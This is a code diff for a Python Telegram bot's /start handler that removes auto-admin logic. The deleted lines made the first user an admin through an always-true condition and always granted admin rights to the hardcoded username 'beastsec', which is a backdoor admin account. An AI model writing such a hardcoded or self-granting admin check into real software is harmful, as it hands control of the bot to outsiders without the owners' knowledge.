@@ -39,21 +39,6 @@ logger = logging.getLogger(__name__)
 async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     """Handle /start command"""
     user_id = update.effective_user.id
-    username = update.effective_user.username
-    
-    # Import ADMIN_IDS to modify it
-    from admin import ADMIN_IDS
-    
-    # Auto-admin: If no admins exist, make @beastsec admin, or first user becomes admin
-    if len(ADMIN_IDS) == 0:
-        if username == "beastsec" or True:  # First user or @beastsec becomes admin
-            ADMIN_IDS.append(user_id)
-            logger.info(f"🔐 New admin added: {username} (ID: {user_id})")
-    
-    # Also check if username is @beastsec and add as admin if not already
-    if username == "beastsec" and user_id not in ADMIN_IDS:
-        ADMIN_IDS.append(user_id)
-        logger.info(f"🔐 @beastsec added as admin (ID: {user_id})")
     
     # Route to admin or user start
     if is_admin(user_id):
